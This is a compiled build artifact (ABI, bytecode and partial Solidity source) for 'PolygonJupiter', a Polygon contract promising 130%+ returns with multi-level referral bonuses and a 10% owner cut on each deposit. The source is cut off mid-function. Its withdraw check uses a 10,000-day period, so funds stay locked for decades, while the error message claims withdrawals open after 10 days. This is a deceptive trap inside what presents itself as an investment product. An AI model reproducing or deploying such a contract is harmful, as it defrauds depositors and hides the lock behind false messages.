{
  "contractName": "PolygonJupiter",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        },
        {
          "indexed": false,
          "internalType": "uint8",
          "name": "tarif",
          "type": "uint8"
        }
      ],
      "name": "NewDeposit",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "from",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "RefPayout",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": true,
          "internalType": "address",
          "name": "referral",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "bonus",
          "type": "uint256"
        }
      ],
      "name": "Referral",
      "type": "event"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": true,
          "internalType": "address",
          "name": "addr",
          "type": "address"
        },
        {
          "indexed": false,
          "internalType": "uint256",
          "name": "amount",
          "type": "uint256"
        }
      ],
      "name": "Withdraw",
      "type": "event"
    },
    {
      "inputs": [],
      "name": "invested",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "investors",
      "outputs": [
        {
          "internalType": "address",
          "name": "referral",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "dividends",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "referral_bonus",
          "type": "uint256"
        },
        {
          "internalType": "uint40",
          "name": "last_payout",
          "type": "uint40"
        },
        {
          "internalType": "uint256",
          "name": "total_invested",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_withdrawn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_referral_bonus",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "name": "ref_bonuses",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "referral_bonus",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint8",
          "name": "",
          "type": "uint8"
        }
      ],
      "name": "tarifs",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "life_days",
          "type": "uint8"
        },
        {
          "internalType": "uint16",
          "name": "percent",
          "type": "uint16"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "withdrawn",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "contractInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "_invested",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_withdrawn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "_referral_bonus",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "investorInfo",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "for_withdrawal",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_invested",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_withdrawn",
          "type": "uint256"
        },
        {
          "internalType": "uint256",
          "name": "total_referral_bonus",
          "type": "uint256"
        },
        {
          "internalType": "uint256[5]",
          "name": "structure",
          "type": "uint256[5]"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint8",
          "name": "_tarif",
          "type": "uint8"
        },
        {
          "internalType": "address",
          "name": "_referral",
          "type": "address"
        }
      ],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdraw",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_addr",
          "type": "address"
        }
      ],
      "name": "payoutOf",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "value",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "withdrawStatus",
      "outputs": [
        {
          "internalType": "bool",
          "name": "_status",
          "type": "bool"
        },
        {
          "internalType": "uint256",
          "name": "_nextPayout",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_index",
          "type": "uint256"
        }
      ],
      "name": "getDepositInfo",
      "outputs": [
        {
          "internalType": "uint8",
          "name": "_tarif",
          "type": "uint8"
        },
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        },
        {
          "internalType": "uint40",
          "name": "_time",
          "type": "uint40"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x60806040526040518060a00160405280605a60ff168152602001602d60ff168152602001601e60ff168152602001600f60ff168152602001600760ff1681525060049060056200005192919062000164565b503480156200005f57600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506000608290506000600a90505b60228160ff16116200015c5760405180604001604052808260ff1681526020018361ffff16815250600560008360ff1660ff16815260200190815260200160002060008201518160000160006101000a81548160ff021916908360ff16021790555060208201518160000160016101000a81548161ffff021916908361ffff16021790555090505060058262000144919062000224565b9150808062000153906200027e565b915050620000ad565b5050620002dc565b826005601f01602090048101928215620001f25791602002820160005b83821115620001c157835183826101000a81548160ff021916908360ff160217905550926020019260010160208160000104928301926001030262000181565b8015620001f05782816101000a81549060ff0219169055600101602081600001049283019260010302620001c1565b505b50905062000201919062000205565b5090565b5b808211156200022057600081600090555060010162000206565b5090565b6000620002318262000263565b91506200023e8362000263565b92508261ffff03821115620002585762000257620002ad565b5b828201905092915050565b600061ffff82169050919050565b600060ff82169050919050565b60006200028b8262000271565b915060ff821415620002a257620002a1620002ad565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b61249c80620002ec6000396000f3fe6080604052600436106100dd5760003560e01c80639d8dd85e1161007f578063b7d9f0d211610059578063b7d9f0d2146102c1578063c80ec522146102fe578063cafb220214610329578063dbcbaca414610354576100dd565b80639d8dd85e1461023c578063a740170914610267578063ab94d950146102a5576100dd565b806361ffe858116100bb57806361ffe858146101655780636da61d1e146101915780636f7bc9be146101ce5780638da5cb5b14610211576100dd565b806315c43aaf146100e25780633ccfd60b1461010f5780635328c2bf14610126575b600080fd5b3480156100ee57600080fd5b506100f7610395565b60405161010693929190611f3f565b60405180910390f35b34801561011b57600080fd5b506101246103ae565b005b34801561013257600080fd5b5061014d600480360381019061014891906119e4565b61063f565b60405161015c93929190612037565b60405180910390f35b34801561017157600080fd5b5061017a6107e5565b604051610188929190611e3b565b60405180910390f35b34801561019d57600080fd5b506101b860048036038101906101b391906119bb565b61090d565b6040516101c59190611f24565b60405180910390f35b3480156101da57600080fd5b506101f560048036038101906101f091906119bb565b610b6d565b6040516102089796959493929190611dcc565b60405180910390f35b34801561021d57600080fd5b50610226610be0565b6040516102339190611db1565b60405180910390f35b34801561024857600080fd5b50610251610c04565b60405161025e9190611f24565b60405180910390f35b34801561027357600080fd5b5061028e60048036038101906102899190611a36565b610c0a565b60405161029c92919061200e565b60405180910390f35b6102bf60048036038101906102ba9190611a5f565b610c49565b005b3480156102cd57600080fd5b506102e860048036038101906102e391906119e4565b610f69565b6040516102f59190611ff3565b60405180910390f35b34801561030a57600080fd5b50610313610f93565b6040516103209190611f24565b60405180910390f35b34801561033557600080fd5b5061033e610f99565b60405161034b9190611f24565b60405180910390f35b34801561036057600080fd5b5061037b600480360381019061037691906119bb565b610f9f565b60405161038c959493929190611f76565b60405180910390f35b6000806000600154600254600354925092509250909192565b6000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905042612710620151806104039190612243565b8260030160009054906101000a900464ffffffffff1664ffffffffff1661042a919061213d565b67ffffffffffffffff1610610474576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161046b90611ec4565b60405180910390fd5b61047d33611167565b600081600101541180610494575060008160020154115b6104d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104ca90611e84565b60405180910390fd5b6000816002015482600101546104e991906120ac565b905060008260010181905550600082600201819055508082600501600082825461051391906120ac565b92505081905550806002600082825461052c91906120ac565b925050819055503373ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f19350505050158015610579573d6000803e3d6000fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc6064836105c1919061217b565b9081150290604051600060405180830381858888f193505050501580156105ec573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f884edad9ce6fa2440d8a54cc123490eb96d2768479d49ff9c7366125a9424364826040516106339190611f24565b60405180910390a25050565b600080600080600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050806007018054905085106106cf576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106c690611e64565b60405180910390fd5b80600701858154811061070b577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b906000526020600020906003020160000160009054906101000a900460ff16816007018681548110610766577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b9060005260206000209060030201600101548260070187815481106107b4577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b906000526020600020906003020160020160009054906101000a900464ffffffffff16935093509350509193909250565b6000806000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000209050426127106201518061083d9190612243565b8260030160009054906101000a900464ffffffffff1664ffffffffff16610864919061213d565b67ffffffffffffffff161042612710620151806108819190612243565b8360030160009054906101000a900464ffffffffff1664ffffffffff166108a8919061213d565b67ffffffffffffffff16116108be5760006108f7565b612710620151806108cf9190612243565b8260030160009054906101000a900464ffffffffff1664ffffffffff166108f6919061213d565b5b8067ffffffffffffffff16905092509250509091565b600080600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060005b8160070180549050811015610b665760008260070182815481106109a1577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b906000526020600020906003020190506000600560008360000160009054906101000a900460ff1660ff1660ff16815260200190815260200160002090506000620151808260000160009054906101000a900460ff1660ff16610a0491906121ac565b62ffffff168360020160009054906101000a900464ffffffffff16610a299190612102565b905060008360020160009054906101000a900464ffffffffff1664ffffffffff168660030160009054906101000a900464ffffffffff1664ffffffffff1611610a87578360020160009054906101000a900464ffffffffff16610a9e565b8560030160009054906101000a900464ffffffffff165b905060008264ffffffffff164211610ab65742610ab8565b825b90508064ffffffffff168264ffffffffff161015610b4e576283d6008460000160009054906101000a900460ff1660ff168560000160019054906101000a900461ffff1661ffff168484610b0c9190612285565b64ffffffffff168860010154610b2291906121e9565b610b2c91906121e9565b610b36919061217b565b610b40919061217b565b88610b4b91906120ac565b97505b50505050508080610b5e90612350565b915050610954565b5050919050565b60066020528060005260406000206000915090508060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16908060010154908060020154908060030160009054906101000a900464ffffffffff16908060040154908060050154908060060154905087565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60035481565b60056020528060005260406000206000915090508060000160009054906101000a900460ff16908060000160019054906101000a900461ffff16905082565b600a8260ff1610158015610c61575060228260ff1611155b8015610c9957506000600560008460ff1660ff16815260200190815260200160002060000160009054906101000a900460ff1660ff16115b610cd8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ccf90611ee4565b60405180910390fd5b678ac7230489e80000341015610d23576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d1a90611ea4565b60405180910390fd5b6000600660003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002090506064816007018054905010610db0576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610da790611f04565b60405180910390fd5b610dbb3383346112be565b8060070160405180606001604052808560ff1681526020013481526020014264ffffffffff16815250908060018154018082558091505060019003906000526020600020906003020160009091909190915060008201518160000160006101000a81548160ff021916908360ff1602179055506020820151816001015560408201518160020160006101000a81548164ffffffffff021916908364ffffffffff160217905550505034816004016000828254610e7791906120ac565b925050819055503460016000828254610e9091906120ac565b92505081905550610ea13334611670565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc600a34610ee8919061217b565b9081150290604051600060405180830381858888f19350505050158015610f13573d6000803e3d6000fd5b503373ffffffffffffffffffffffffffffffffffffffff167f0d86f10953d9873a5957019d43d6ec46ac821d7ef9c936a0e65340552e78b79b3485604051610f5c929190611fca565b60405180910390a2505050565b60048160058110610f7957600080fd5b60209182820401919006915054906101000a900460ff1681565b60025481565b60015481565b600080600080610fad611945565b6000600660008873ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020905060003073ffffffffffffffffffffffffffffffffffffffff16636da61d1e896040518263ffffffff1660e01b815260040161102b9190611db1565b60206040518083038186803b15801561104357600080fd5b505afa158015611057573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061107b9190611a0d565b905060005b60058160ff16101561112557826008018160ff16600581106110cb577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b0154848260ff1660058110611109577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602002018181525050808061111d90612399565b915050611080565b50816002015482600101548261113b91906120ac565b61114591906120ac565b8260040154836005015484600601549650965096509650505091939590929450565b60003073ffffffffffffffffffffffffffffffffffffffff16636da61d1e836040518263ffffffff1660e01b81526004016111a29190611db1565b60206040518083038186803b1580156111ba57600080fd5b505afa1580156111ce573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906111f29190611a0d565b905060008111156112ba5742600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060030160006101000a81548164ffffffffff021916908364ffffffffff16021790555080600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060010160008282546112b291906120ac565b925050819055505b5050565b600073ffffffffffffffffffffffffffffffffffffffff16600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff161480156113a8575060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff1614155b1561166b576000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060070180549050141561141f5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1691505b81600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167faeecfcda1271d292db728294b8ae465871ec039d51404caf49a7eb0ade51770a6064846114fc919061217b565b6040516115099190611f24565b60405180910390a360005b600560ff168160ff16101561166957600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206008018160ff16600581106115a0577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b0160008154809291906115b290612350565b9190505550600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff169250600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff16141561165657611669565b808061166190612399565b915050611514565b505b505050565b6000600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905060005b60058160ff16101561193f57600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff1614156117205761193f565b60006103e861ffff1660048360ff1660058110611766577f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b602091828204019190069054906101000a900460ff1660ff168561178a91906121e9565b611794919061217b565b905080600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060020160008282546117e891906120ac565b9250508190555080600660008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600601600082825461184191906120ac565b92505081905550806003600082825461185a91906120ac565b925050819055508473ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fc843fb70235723c89d6a9f7d21874343107d3793f012458d6b93208311492fd6836040516118be9190611f24565b60405180910390a3600660008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060000160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16925050808061193790612399565b9150506116da565b50505050565b6040518060a00160405280600590602082028036833780820191505090505090565b60008135905061197681612421565b92915050565b60008135905061198b81612438565b92915050565b6000815190506119a081612438565b92915050565b6000813590506119b58161244f565b92915050565b6000602082840312156119cd57600080fd5b60006119db84828501611967565b91505092915050565b6000602082840312156119f657600080fd5b6000611a048482850161197c565b91505092915050565b600060208284031215611a1f57600080fd5b6000611a2d84828501611991565b91505092915050565b600060208284031215611a4857600080fd5b6000611a56848285016119a6565b91505092915050565b60008060408385031215611a7257600080fd5b6000611a80858286016119a6565b9250506020611a9185828601611967565b9150509250929050565b6000611aa78383611d75565b60208301905092915050565b611abc816122b9565b82525050565b611acb81612078565b611ad58184612090565b9250611ae08261206e565b8060005b83811015611b11578151611af88782611a9b565b9650611b0383612083565b925050600181019050611ae4565b505050505050565b611b22816122cb565b82525050565b6000611b3560238361209b565b91507f496e646578206f7574206f662072616e6765206f6620796f7572206465706f7360008301527f69747300000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b6000611b9b602f8361209b565b91507f596f75206e65656420746f206d616b652061206465706f73697420696e206f7260008301527f64657220746f20776974686472617700000000000000000000000000000000006020830152604082019050919050565b6000611c0160228361209b565b91507f4d696e696d756d206465706f73697420616d6f756e74206973203130204d415460008301527f49430000000000000000000000000000000000000000000000000000000000006020830152604082019050919050565b6000611c67603d8361209b565b91507f596f752063616e207769746864726177206f6e6c79206166746572203130206460008301527f6179732066726f6d20796f7572206c617374207769746864726177616c0000006020830152604082019050919050565b6000611ccd600f8361209b565b91507f5461726966206e6f7420666f756e6400000000000000000000000000000000006000830152602082019050919050565b6000611d0d60288361209b565b91507f4d617820313030206465706f736974732070657220616464726573732061726560008301527f20616c6c6f7765640000000000000000000000000000000000000000000000006020830152604082019050919050565b611d6f816122d7565b82525050565b611d7e81612314565b82525050565b611d8d81612314565b82525050565b611d9c8161231e565b82525050565b611dab81612343565b82525050565b6000602082019050611dc66000830184611ab3565b92915050565b600060e082019050611de1600083018a611ab3565b611dee6020830189611d84565b611dfb6040830188611d84565b611e086060830187611d93565b611e156080830186611d84565b611e2260a0830185611d84565b611e2f60c0830184611d84565b98975050505050505050565b6000604082019050611e506000830185611b19565b611e5d6020830184611d84565b9392505050565b60006020820190508181036000830152611e7d81611b28565b9050919050565b60006020820190508181036000830152611e9d81611b8e565b9050919050565b60006020820190508181036000830152611ebd81611bf4565b9050919050565b60006020820190508181036000830152611edd81611c5a565b9050919050565b60006020820190508181036000830152611efd81611cc0565b9050919050565b60006020820190508181036000830152611f1d81611d00565b9050919050565b6000602082019050611f396000830184611d84565b92915050565b6000606082019050611f546000830186611d84565b611f616020830185611d84565b611f6e6040830184611d84565b949350505050565b600061012082019050611f8c6000830188611d84565b611f996020830187611d84565b611fa66040830186611d84565b611fb36060830185611d84565b611fc06080830184611ac2565b9695505050505050565b6000604082019050611fdf6000830185611d84565b611fec6020830184611da2565b9392505050565b60006020820190506120086000830184611da2565b92915050565b60006040820190506120236000830185611da2565b6120306020830184611d66565b9392505050565b600060608201905061204c6000830186611da2565b6120596020830185611d84565b6120666040830184611d93565b949350505050565b6000819050919050565b600060059050919050565b6000602082019050919050565b600081905092915050565b600082825260208201905092915050565b60006120b782612314565b91506120c283612314565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156120f7576120f66123c3565b5b828201905092915050565b600061210d8261231e565b91506121188361231e565b92508264ffffffffff03821115612132576121316123c3565b5b828201905092915050565b60006121488261232f565b91506121538361232f565b92508267ffffffffffffffff038211156121705761216f6123c3565b5b828201905092915050565b600061218682612314565b915061219183612314565b9250826121a1576121a06123f2565b5b828204905092915050565b60006121b782612305565b91506121c283612305565b92508162ffffff04831182151516156121de576121dd6123c3565b5b828202905092915050565b60006121f482612314565b91506121ff83612314565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff0483118215151615612238576122376123c3565b5b828202905092915050565b600061224e8261232f565b91506122598361232f565b92508167ffffffffffffffff048311821515161561227a576122796123c3565b5b828202905092915050565b60006122908261231e565b915061229b8361231e565b9250828210156122ae576122ad6123c3565b5b828203905092915050565b60006122c4826122e5565b9050919050565b60008115159050919050565b600061ffff82169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600062ffffff82169050919050565b6000819050919050565b600064ffffffffff82169050919050565b600067ffffffffffffffff82169050919050565b600060ff82169050919050565b600061235b82612314565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82141561238e5761238d6123c3565b5b600182019050919050565b60006123a482612343565b915060ff8214156123b8576123b76123c3565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b61242a816122b9565b811461243557600080fd5b50565b61244181612314565b811461244c57600080fd5b50565b61245881612343565b811461246357600080fd5b5056fea26469706673582212204412c8b94803666b5d2e5c91b687bbf03342791aa805b20b296f76c0066a3c1c64736f6c63430008000033",
  "immutableReferences": {},
  "source": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nstruct Tarif {\n    uint8 life_days;\n    uint16 percent;\n}\n\nstruct Deposit {\n    uint8 tarif;\n    uint256 amount;\n    uint40 time;\n}\n\nstruct Investor {\n    address referral;\n    uint256 dividends;\n    uint256 referral_bonus;\n    uint40 last_payout;\n    uint256 total_invested;\n    uint256 total_withdrawn;\n    uint256 total_referral_bonus;\n    Deposit[] deposits;\n    uint256[5] structure;\n}\n\ncontract PolygonJupiter {\n    address public owner;\n\n    uint256 public invested;\n    uint256 public withdrawn;\n    uint256 public referral_bonus;\n\n    uint8 constant BONUS_LEVELS_COUNT = 5;\n    uint16 constant PERCENT_DIVIDER = 1000;\n    uint64 constant WITHDRAW_PERIOD_DAYS = 10000;\n    uint8[BONUS_LEVELS_COUNT] public ref_bonuses = [90, 45, 30, 15, 7];\n\n    mapping(uint8 => Tarif) public tarifs;\n    mapping(address => Investor) public investors;\n\n    event Referral(\n        address indexed addr,\n        address indexed referral,\n        uint256 bonus\n    );\n    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);\n    event RefPayout(address indexed addr, address indexed from, uint256 amount);\n    event Withdraw(address indexed addr, uint256 amount);\n\n    constructor() {\n        owner = msg.sender;\n        uint16 tarifPercent = 130;\n        for (uint8 tarifDays = 10; tarifDays <= 34; tarifDays++) {\n            tarifs[tarifDays] = Tarif(tarifDays, tarifPercent);\n            tarifPercent += 5;\n        }\n    }\n\n    function contractInfo()\n        external\n        view\n        returns (\n            uint256 _invested,\n            uint256 _withdrawn,\n            uint256 _referral_bonus\n        )\n    {\n        return (invested, withdrawn, referral_bonus);\n    }\n\n    function investorInfo(address _addr)\n        external\n        view\n        returns (\n            uint256 for_withdrawal,\n            uint256 total_invested,\n            uint256 total_withdrawn,\n            uint256 total_referral_bonus,\n            uint256[BONUS_LEVELS_COUNT] memory structure\n        )\n    {\n        Investor storage investor = investors[_addr];\n\n        uint256 payout = this.payoutOf(_addr);\n\n        for (uint8 i = 0; i < ref_bonuses.length; i++) {\n            structure[i] = investor.structure[i];\n        }\n\n        return (\n            payout + investor.dividends + investor.referral_bonus,\n            investor.total_invested,\n            investor.total_withdrawn,\n            investor.total_referral_bonus,\n            structure\n        );\n    }\n\n    function _payout(address _addr) private {\n        uint256 payout = this.payoutOf(_addr);\n\n        if (payout > 0) {\n            investors[_addr].last_payout = uint40(block.timestamp);\n            investors[_addr].dividends += payout;\n        }\n    }\n\n    function _refPayout(address _addr, uint256 _amount) private {\n        address up = investors[_addr].referral;\n\n        for (uint8 i = 0; i < ref_bonuses.length; i++) {\n            if (up == address(0)) break;\n\n            uint256 bonus = (_amount * ref_bonuses[i]) / PERCENT_DIVIDER;\n\n            investors[up].referral_bonus += bonus;\n            investors[up].total_referral_bonus += bonus;\n\n            referral_bonus += bonus;\n\n            emit RefPayout(up, _addr, bonus);\n\n            up = investors[up].referral;\n        }\n    }\n\n    function _setReferral(\n        address _addr,\n        address _referral,\n        uint256 _amount\n    ) private {\n        if (investors[_addr].referral == address(0) && _addr != owner) {\n            if (investors[_referral].deposits.length == 0) {\n                _referral = owner;\n            }\n\n            investors[_addr].referral = _referral;\n\n            emit Referral(_addr, _referral, _amount / 100);\n\n            for (uint8 i = 0; i < BONUS_LEVELS_COUNT; i++) {\n                investors[_referral].structure[i]++;\n\n                _referral = investors[_referral].referral;\n\n                if (_referral == address(0)) break;\n            }\n        }\n    }\n\n    function deposit(uint8 _tarif, address _referral) external payable {\n        require(\n            _tarif >= 10 && _tarif <= 34 && tarifs[_tarif].life_days > 0,\n            \"Tarif not found\"\n        );\n        require(msg.value >= 10 ether, \"Minimum deposit amount is 10 MATIC\");\n\n        Investor storage investor = investors[msg.sender];\n\n        require(\n            investor.deposits.length < 100,\n            \"Max 100 deposits per address are allowed\"\n        );\n\n        _setReferral(msg.sender, _referral, msg.value);\n\n        investor.deposits.push(\n            Deposit({\n                tarif: _tarif,\n                amount: msg.value,\n                time: uint40(block.timestamp)\n            })\n        );\n\n        investor.total_invested += msg.value;\n        invested += msg.value;\n\n        _refPayout(msg.sender, msg.value);\n\n        payable(owner).transfer(msg.value / 10);\n\n        emit NewDeposit(msg.sender, msg.value, _tarif);\n    }\n\n    function withdraw() external {\n        Investor storage investor = investors[msg.sender];\n\n        require(\n            investor.last_payout + (86400 * WITHDRAW_PERIOD_DAYS) <\n                block.timestamp,\n            \"You can withdraw only after 10 days from your last withdrawal\"\n        );\n        _payout(msg.sender);\n\n        require(\n            investor.dividends > 0 || investor.referral_bonus > 0,\n            \"You need to make a deposit in order to withdraw\"\n        );\n\n        uint256 amount = investor.dividends + investor.referral_bonus;\n\n        investor.dividends = 0;\n        investor.referral_bonus = 0;\n        investor.total_withdrawn += amount;\n        withdrawn += amount;\n\n        payable(msg.sender).transfer(amount);\n        payable(owner).transfer(amount / 100);\n\n        emit Withdraw(msg.sender, amount);\n    }\n\n    function payoutOf(address _addr) external view returns (uint256 value) {\n        Investor storage investor = investors[_addr];\n\n        for (uint256 i = 0; i < investor.deposits.length; i++) {\n            Deposit storage dep = investor.deposits[i];\n            Tarif storage tarif = tarifs[dep.tarif];\n\n            uint40 time_end = dep.time + tarif.life_days * 86400;\n            uint40 from = investor.last_payout > dep.time\n                ? investor.last_payout\n                : dep.time;\n            uint40 to = block.timestamp > time_end\n                ? time_end\n                : uint40(block.timestamp);\n            if (from < to) {\n                value +=\n                    (dep.amount * (to - from) * tarif.percent) /\n                    tarif.life_days /\n                    8640000;\n            }\n        }\n        return value;\n    }\n\n    function withdrawStatus()\n        external\n        view\n        returns (bool _status, uint256 _nextPayout)\n    {\n        Investor storage investor = investors[msg.sender];\n        return (\n            investor.last_payout + (86400 * WITHDRAW_PERIOD_DAYS) <\n                block.timestamp,\n            investor.last_payout + (86400 * WITHDRAW_PERIOD_DAYS) >\n                block.timestamp\n                ? investor.last_payout + (86400 * WITHDRAW_PERIOD_DAYS)\n                : 0\n        );\n    }\n\n    function getDepositInfo(uint256 _index)\n        external\n        view\n        returns (\n            uint8 